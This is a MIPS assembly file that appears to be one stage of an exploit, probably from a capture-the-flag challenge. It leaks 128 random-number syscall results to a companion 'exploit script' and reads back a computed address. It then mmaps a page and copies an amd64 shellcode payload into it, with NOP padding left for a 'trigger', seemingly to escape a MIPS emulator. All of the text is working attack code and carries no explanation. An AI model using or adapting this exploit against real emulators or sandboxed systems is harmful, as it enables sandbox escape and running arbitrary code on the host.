.set noreorder

# Write the "PWN!" marker to memory
lui $t0, 0x214e
ori $t0, $t0, 0x5750
lui $a1, 0x40
ori $a1, $a1, 0xc000
sw $t0, 0($a1)

# Output the marker to tell the exploit script we're sending random numbers now
li $a0, 1
li $a2, 4
li $v0, 4004 # write
syscall

# Setup loop counters
li $s0, 128
li $s1, 0

write_randoms_loop:
# Get a random number
li $v0, 4005 # rand
syscall

# Write the random number to memory
lui $a1, 0x40
ori $a1, $a1, 0xc000
sw $v0, 0($a1)

# Give the random number to the exploit script
li $a0, 1
li $a2, 4
li $v0, 4004 # write
syscall

# Send 128 random numbers to the exploit script
addi $s1, $s1, 1
bne $s0, $s1, write_randoms_loop
nop

# Read in the calculated address
li $a0, 0
lui $a1, 0x40
ori $a1, $a1, 0xc000
li $a2, 8
li $v0, 4003 # read
syscall

# Allocate the page
lui $a0,0x50
li $a1,4096
li $v0,4014 # mmap
syscall

# Setup loop counters for the copy loop
li $s0,32
li $s1,0

# Copy our x86 shellcode to the new page
lui $t1, 0x40
ori $t1, $t1, 0xa0b8
addi $t1, $t1, amd64

copy_shellcode_loop:
lw $t0, 0($t1)
sw $t0, 0($v0)

# Increment the loop counter and advance the src and dest of the copy
addi $s1, $s1, 1
addi $t1, $t1, 4
addi $v0, $v0, 4

# Do 32 copies
bne $s0, $s1, copy_shellcode_loop
nop

# Load a2/a3 with the address of our amd64 payload
lui $a1,0x40
ori $a1, $a1,0xc000
lw $a2, 0($a1)
lw $a3, 4($a1)
li $s4, 13107

# NOPs for spacing that will be replaced with the trigger
nop
nop

amd64:
